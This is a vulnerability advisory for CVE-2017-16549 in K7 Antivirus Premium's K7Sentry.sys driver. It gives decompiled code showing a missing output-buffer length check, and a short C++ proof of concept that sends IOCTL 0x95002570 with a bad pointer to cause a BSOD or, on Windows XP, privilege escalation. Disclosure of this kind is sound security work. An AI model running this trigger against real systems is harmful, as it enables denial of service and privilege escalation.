# CVE-2017-16549

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7Sentry.sys 15.1.0.45*
  * SHA256: 7037F80EC73F4D6E2DFBD2AA675FF154F81AAB2FB7372680AAA1D2D41DB93771


# Details
The issue lies in the dispatch handler for the IRP_MJ_DEVICE_CONTROL (sub_00018FC0). The handler code for IoControlCode 0x95002570 does not check the length of the output buffer before using it and assigns a 4 byte value to the output buffer. As is visible from the case 0x9500256C, **before** *pOutputBuffer* is assigned to, *dwOutLength* is checked to ensure it can hold a 4 byte value. In in the case for 0x95002570, no such check exists.

 The code snippet below is the decompiled code which has been named and commented up to illustrate the problem.


```C++
case 0x9500256C:  // This IOCTL is fine as it length checks the parameters
    if ( stIoControlBuffer.InputBufferLength < 4u || !pInputBuffer )
        goto LABEL_49;
    // Check here to ensure that the output length is >= 4
    if ( dwOutLength_1 < 4 )
        goto LABEL_39;
    // Write 4 bytes to it (32-bit so PVOID is 4 bytes in this case)
    *pOutputBuffer = (PVOID)1;
    *v2 = 4;
    v9 = 0;
    goto LABEL_117;
case 0x95002570:
    *v2 = 4;
    // Bug: No check here to ensure you are allowed to write to pOutputBuffer
    *pOutputBuffer = (PVOID)dword_4EFF0;
    v9 = 0;
    goto LABEL_117;
```

# PoC Code
This PoC will open a connection to the driver and call it with the approiate IOCTL code to geneate the crash.

```c++
HANDLE hDevice = CreateFileW(L"\\\\.\\k7sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
if (hDevice != INVALID_HANDLE_VALUE)
{
    DeviceIoControl(hDevice, 0x95002570, (PVOID)arrInBuffer, 0, (PVOID)0xaaaaaaaa, 0, &dwBytesReturned, NULL);
}
```

On Windows XP, this will attempt to write the value of *dword_4EFF0* to *0xaaaaaaaa*. On this platform, this could be easily used for a privilege escallation.

On Windows 7 and above, this will attempt to write the value at *dword_4EFF0* to 0x00000000 and will cause a BSOD. This would simply be an availability issues.
